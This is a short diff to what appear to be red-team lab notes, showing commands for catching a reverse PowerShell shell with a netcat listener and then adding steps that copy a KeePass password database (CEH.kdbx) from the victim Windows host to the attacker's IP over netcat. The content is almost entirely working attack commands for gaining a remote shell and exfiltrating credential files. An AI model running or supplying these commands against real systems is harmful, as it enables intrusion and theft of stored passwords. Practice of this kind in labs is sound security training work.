@@ -77,3 +77,10 @@ Microsoft Windows [Version 6.3.9600]
 #Run the Remote powershell exploit on the Redteam(Attacker)
 $nc -lvp 60002
 python send_powershell_payload.py x.x.x.x LHOST 60002
+
+
+#Send File after uploading shell to windows
+#RedTeam (Attacker) Listen for file
+nc -lp 1235 >CEH.kdbx
+#BlueTeam(Victim) Sent file
+nc64.exe -w 3 10.10.14.19 1235 < CEH.kdbx
